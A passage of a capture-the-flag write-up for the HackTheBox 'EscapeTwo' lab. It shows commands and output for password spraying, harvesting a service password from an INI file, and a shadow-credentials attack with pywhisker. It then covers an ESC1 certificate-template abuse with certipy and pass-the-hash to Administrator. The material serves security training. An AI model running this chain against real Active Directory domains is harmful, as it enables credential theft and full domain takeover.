MSSQL       10.10.11.51     1433   None             [*] None (name:10.10.11.51) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   None             [-] sequel.htb\rose:KxEPkKe6R8su name 'logging' is not defined
MSSQL       10.10.11.51     1433   None             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.10.11.51     1433   None             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
MSSQL       10.10.11.51     1433   None             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
...
...
...
```

## Initial Foothold

The `crackmapexec` tool’s output gives no result, so test the combination manually and found a correct combination which was gotten from the `accounts.xlsx` file extraction time.

![image.png](https://github.com/het-desai/hackthebox/blob/main/escapetwo/image%201.png)

Try to get a reverse shell using the MS-SQL database. Here, a `PowerShell #3 (Base64)` payload from the [revshells](https://www.revshells.com/) was used.

## Enumeration from Low Privileged User

After following a lot of basic Windows privilege escalation enumeration, I finally found some lead in a configuration file of the SQL2019's directory.

```
PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

After finishing this box, I found another cool method to quickly spot any `password` keyword written anywhere in the XML, INI, or TXT file using the `findstr` tool.

```
PS C:\SQL2019\ExpressAdv_ENU> findstr /si password *.xml *.ini *.txt
sql-Configuration.INI:SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
```

## Lateral Movement

Try this new password against our usernames list and find a combination for a `ryan` user.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ crackmapexec winrm 10.10.11.51 -u usernames.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success
SMB         10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
HTTP        10.10.11.51     5985   DC01             [*] http://10.10.11.51:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.51     5985   DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
...
...
...
```

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ evil-winrm -i 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami
sequel\ryan
*Evil-WinRM* PS C:\Users\ryan\Documents> hostname
DC01
*Evil-WinRM* PS C:\Users\ryan\Documents> ipconfig
Windows IP Configuration

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.11.51
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2

*Evil-WinRM* PS C:\Users> tree /F .
Folder PATH listing
Volume serial number is 3705-289D
C:\USERS
ÃÄÄÄAdministrator
ÃÄÄÄPublic
ÃÄÄÄryan
³   ÃÄÄÄDesktop
³   ³       user.txt
³   ³
³   ÃÄÄÄDocuments
³   ÃÄÄÄDownloads
³   ÃÄÄÄFavorites
³   ÃÄÄÄLinks
³   ÃÄÄÄMusic
³   ÃÄÄÄPictures
³   ÃÄÄÄSaved Games
³   ÀÄÄÄVideos
ÀÄÄÄsql_svca
*Evil-WinRM* PS C:\Users> exit
                                        
Info: Exiting with code 0
                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ cd ~/tools/windows

┌──(kali㉿kali)-[~/tools/windows]
└─$ ls -l SharpHound.ps1 
-rw-r--r-- 1 kali kali 1308348 Feb 22 14:01 SharpHound.ps1
                                                                                                                                                                            
┌──(kali㉿kali)-[~/tools/windows]
└─$ evil-winrm -i 10.10.11.51 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> cd ../Videos
*Evil-WinRM* PS C:\Users\ryan\Videos> upload SharpHound.ps1
                                        
Info: Uploading /home/kali/tools/windows/SharpHound.ps1 to C:\Users\ryan\Videos\SharpHound.ps1
                                        
Data: 1744464 bytes of 1744464 bytes copied
                                        
Info: Upload successful!

```

After trying usual Windows local privilege escalation but didn’t getting any success then ran the `SharpHound.ps1` script as a `ryan` user. Note: `SharpHound.ps1` script won't work using `evil-winrm` tool. Need a reverse shell. So, generate a revershell using the msfvenom tool.

![image.png](https://github.com/het-desai/hackthebox/blob/main/escapetwo/image%202.png)

In the `Terminal 2` where we got a new reverse shell, there we need to import the SharpHound.ps1 module and run it.

```
C:\Users\ryan\Videos>powershell -ep bypass
powershell -ep bypass
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\ryan\Videos> Import-Module ./SharpHound.ps1
Import-Module ./SharpHound.ps1
PS C:\Users\ryan\Videos> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\ryan\Videos\
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\ryan\Videos\
2025-04-16T06:11:52.9434386-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2025-04-16T06:11:53.1309364-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-04-16T06:11:53.1465620-07:00|INFORMATION|Initializing SharpHound at 6:11 AM on 4/16/2025
2025-04-16T06:11:53.2559323-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for sequel.htb : DC01.sequel.htb
2025-04-16T06:11:53.3965759-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-04-16T06:11:53.5215718-07:00|INFORMATION|Beginning LDAP search for sequel.htb
2025-04-16T06:11:53.5684413-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-04-16T06:11:53.5684413-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-04-16T06:12:23.7404862-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 89 MB RAM
2025-04-16T06:12:39.4278095-07:00|INFORMATION|Consumers finished, closing output channel
2025-04-16T06:12:39.4590567-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-04-16T06:12:39.6309396-07:00|INFORMATION|Status: 103 objects finished (+103 2.23913)/s -- Using 104 MB RAM
2025-04-16T06:12:39.6309396-07:00|INFORMATION|Enumeration finished in 00:00:46.1039535
2025-04-16T06:12:39.7090575-07:00|INFORMATION|Saving cache with stats: 62 ID to type mappings.
 62 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-04-16T06:12:39.7090575-07:00|INFORMATION|SharpHound Enumeration Completed at 6:12 AM on 4/16/2025! Happy Graphing!
```

Using `Terminal 1: (Evil-WinR)` transfer the file to the attacking Kali machine.

```
*Evil-WinRM* PS C:\Users\ryan\Videos> dir

    Directory: C:\Users\ryan\Videos

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/16/2025   6:12 AM          12007 20250416061239_BloodHound.zip
-a----        4/16/2025   6:07 AM           7168 met6.exe
-a----        4/16/2025   6:12 AM           9210 NGZlZGJhNTUtZGMxZi00MzRhLTkxYzUtZWNjYjM1NGU4YzNl.bin
-a----        4/16/2025   6:00 AM        1308348 SharpHound.ps1

*Evil-WinRM* PS C:\Users\ryan\Videos> download 20250416061239_BloodHound.zip
                                        
Info: Downloading C:\Users\ryan\Videos\20250416061239_BloodHound.zip to 20250416061239_BloodHound.zip
                                        
Info: Download successful!
```

## Privilege Escalation

Now, start `Neo4j` and `Bloodhound` to open the SharpHound created file.

![image.png](https://github.com/het-desai/hackthebox/blob/main/escapetwo/image%203.png)

![image.png](https://github.com/het-desai/hackthebox/blob/main/escapetwo/image%204.png)

![image.png](https://github.com/het-desai/hackthebox/blob/main/escapetwo/image%205.png)

Given Help’s Linux Abuse method is a bit tricky to exploit. After going through a lot of blogs, write-ups, and Google searches and found a few useful articles.

1. [YT: Python Tutorial: VENV (Mac & Linux) - How to Use Virtual Environments with the Built-In venv Module](https://www.youtube.com/watch?v=Kg1Yvry_Ydk)
2. [Understanding the Shadow Credentials Attack Vector](https://bloodstiller.com/articles/shadowcredentialsattack/)
3. [Attack and Detection of Shadow Credentials](https://www.youtube.com/watch?v=IK7qPMqSKMY&feature=youtu.be)

Now here are the steps to exploit the vulnerability in theory.

1. Make `ryan` user as an owner of the `ca_svc` user account.
2. Give full permission to ourselves using the `ca_svc` account.
3. Perform a shadow credential attack using the `pywhisker` tool.
4. Make a TGT request using the `gettgtpkinit` tool and save it into the cache file.
5. Extract the NT hash from the generated cache file.
6. Test the extracted hash using the `crackmapexec` tool.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$ mkdir temp

┌──(kali㉿kali)-[~/htb/EscapeTwo]
└─$cd temp

┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
...
...
...
/usr/share/doc/python3-impacket/examples/owneredit.py:105: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
...
...
...
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!

┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:WqSZAF6CysDQbGb3
...
...
...
/usr/share/doc/python3-impacket/examples/dacledit.py:120: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
...
...
...
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250416-113103.bak
[*] DACL modified successfully!

┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ ls -l             
total 8
-rw-rw-r-- 1 kali kali 4832 Apr 16 11:33 dacledit-20250416-113348.bak

┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ python3 ~/tools/windows/pywhisker/pywhisker/pywhisker.py -d "sequel.htb" -u "ryan" -p "WqSZAF6CysDQbGb3" --target "ca_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=Certification Authority,CN=Users,DC=sequel,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3c07189e-e682-991f-8bd0-32ae998a597d
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: Fr0P71NR.pfx
[+] PFX exportiert nach: Fr0P71NR.pfx
[i] Passwort für PFX: 1LMf1ZrLhfPoMMKnj5Bj
[+] Saved PFX (#PKCS12) certificate & key at path: Fr0P71NR.pfx
[*] Must be used with password: 1LMf1ZrLhfPoMMKnj5Bj
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ python3 ~/tools/windows/PKINITtools/gettgtpkinit.py -cert-pem mVOcthju_cert.pem -key-pem mVOcthju_priv.pem sequel.htb/ca_svc ca_svc.ccache 
2025-04-15 14:22:54,840 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
zsh: segmentation fault  python3 ~/tools/windows/PKINITtools/gettgtpkinit.py -cert-pem  -key-pem
```

The `gettgtpkinit` tool won't work. After reading the [issue](https://github.com/dirkjanm/PKINITtools/issues/16) tab, get an idea that there is an issue with the minikerberos version issue. The solution is to use the python module `virtualenv` to use a python virtual environment to execute the `gettgtpkinit.py` script.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ virtualenv venv
created virtual environment CPython3.13.2.final.0-64 in 623ms
  creator CPython3Posix(dest=/home/kali/htb/EscapeTwo/temp/venv, clear=False, no_vcs_ignore=False, global=False)
  seeder FromAppData(download=False, pip=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)
    added seed packages: pip==25.0.1
  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator

┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ source venv/bin/activate

┌──(venv)─(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ pip3 install minikerberos pyasn1 impacket
Collecting minikerberos
  Using cached minikerberos-0.4.4-py3-none-any.whl.metadata (575 bytes)
Collecting asn1crypto>=1.5.1 (from minikerberos)
...
...
...

┌──(venv)─(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ python3 ~/tools/windows/PKINITtools/gettgtpkinit.py -cert-pem mVOcthju_cert.pem -key-pem mVOcthju_priv.pem sequel.htb/ca_svc ca_svc.ccache
2025-04-15 14:25:11,927 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-15 14:25:11,935 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-15 14:25:24,111 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-15 14:25:24,112 minikerberos INFO     78b98e0e803e0588425d4866f889e743267e3d95ecef1150513247c73907fac3
INFO:minikerberos:78b98e0e803e0588425d4866f889e743267e3d95ecef1150513247c73907fac3
2025-04-15 14:25:24,117 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

┌──(venv)─(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ export KRB5CCNAME=./ca_svc.ccache

┌──(venv)─(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ python3 ~/tools/windows/PKINITtools/getnthash.py -key 78b98e0e803e0588425d4866f889e743267e3d95ecef1150513247c73907fac3 sequel.htb/CA_SVC
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
3b181b914e7a9d5508ea1e20bc2b7fce

┌──(venv)─(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ deactivate

┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ crackmapexec smb 10.10.11.51 -u 'ca_svc' -H '3b181b914e7a9d5508ea1e20bc2b7fce'        
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce
```

After getting the `ca_svc` user’s hash, check the cert vulnerability using the `certipy-ad` tool.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ certipy-ad find -vulnerable -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250415143125_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250416115049_Certipy.txt'
[*] Saved JSON output to '20250416115049_Certipy.json'
```

![image.png](https://github.com/het-desai/hackthebox/blob/main/escapetwo/image%206.png)

The above JSON file says ESC4 vulnerability, but here we need to perform an [ESC1](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1) certificate attack to get an administrator certificate.

First of all, back up the original certificate and then perform an ESC1 attack on the certificate.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ certipy-ad template -username ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'

┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ certipy-ad req -username ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 26
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Now authenticate as an Administrator user.

```
┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ certipy-ad auth -pfx administrator.pfx -domain sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff

┌──(kali㉿kali)-[~/htb/EscapeTwo/temp]
└─$ evil-winrm -i 10.10.11.51 -u 'administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```

## Lession Learned
1. xlsx files can be extract.
2. Check the sensitive files which contains password in configruation, ini, txt files.